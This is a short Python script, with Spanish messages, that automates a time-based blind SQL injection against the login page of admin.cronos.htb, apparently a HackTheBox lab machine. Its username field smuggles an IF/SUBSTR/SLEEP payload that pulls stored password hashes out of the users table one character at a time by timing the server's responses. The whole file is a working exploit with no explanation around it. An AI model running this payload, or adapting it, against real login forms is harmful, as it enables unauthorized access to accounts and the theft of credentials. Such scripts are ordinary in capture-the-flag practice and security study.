#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Password")

    password = ""

    for user in range(0, 4):
        for position in range(1, 50):
            for character in s:
                p1.status("PosiciÃ³n nÃºmero %d de la extracciÃ³n de contraseÃ±a del usuario admin | Caracter %c" % (position, character))
                post_data = {
                    'username': "admin' and if(substr((select password from users limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (user, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    password += character
                    p2.status(password)

if __name__ == '__main__':

    makeRequest()
